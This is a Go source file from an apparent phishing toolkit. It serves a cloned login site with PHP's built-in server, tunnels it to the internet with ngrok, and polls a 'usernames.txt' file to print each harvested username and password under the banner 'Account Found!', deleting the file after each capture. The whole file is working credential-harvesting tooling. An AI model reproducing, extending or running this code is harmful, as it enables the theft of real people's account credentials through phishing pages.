package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	DEFAULT_PHP_URL = "127.0.0.1:3333"
)

func generateSitePath(site string) string {
	var builder strings.Builder
	fmt.Fprintf(&builder, "sites/%s", site)
	return builder.String()
}

func generateUserPath(site string) string {
	var builder strings.Builder
	fmt.Fprintf(&builder, "sites/%s/usernames.txt", site)
	return builder.String()
}

func executePhp(site string) (*exec.Cmd, error) {

	path := generateSitePath(site)

	phpExec, _ := exec.LookPath("php")

	php := &exec.Cmd{
		Path:   phpExec,
		Args:   []string{phpExec, "-S", DEFAULT_PHP_URL},
		Dir:    path,
		Stdout: nil,
		Stderr: nil,
	}

	if err := php.Start(); err != nil {
		return nil, err
	}

	return php, nil
}

func executeNgrok() (*exec.Cmd, error) {
	ngrok := &exec.Cmd{
		Path:   NGROK_EXECUTABLE_NAME,
		Args:   []string{NGROK_EXECUTABLE_NAME, "http", DEFAULT_PHP_URL},
		Stdout: nil,
		Stderr: nil,
	}
	if err := ngrok.Start(); err != nil {
		return nil, err
	}
	return ngrok, nil
}

func getUsername(userPath string) (string, string, error) {
	f, err := os.Open(userPath)
	if err != nil {
		return "", "", err
	}
	defer f.Close()

	b, _ := ioutil.ReadAll(f)
	info := strings.Split(string(b), " ")

	return info[1], info[3], nil
}


func printUsername(username, password string) {
	fmt.Printf("%s[%s*%s] %sAccount Found! %s\n", string(colorWhite), string(colorYellow), string(colorWhite), string(colorYellow), string(colorReset))
	fmt.Printf("%s	⊢%s Username%s:%s %s\n", string(colorYellow), string(colorWhite), string(colorYellow), string(colorReset), username)
	fmt.Printf("%s	﹂%s Password%s:%s %s\n", string(colorYellow), string(colorWhite), string(colorYellow), string(colorReset), password)
	fmt.Println()
}

func checkPhish(site string) error {

	userPath := generateUserPath(site)
	for {
		if check, err := isFileExists(userPath); err == nil && check {

			if name, password, err := getUsername(userPath); err != nil {
				return err
			} else {
				printUsername(name, password)
			}
			if err := os.Remove(userPath); err != nil {
				return err
			}
		}
		time.Sleep(500 * time.Millisecond)

	}
}
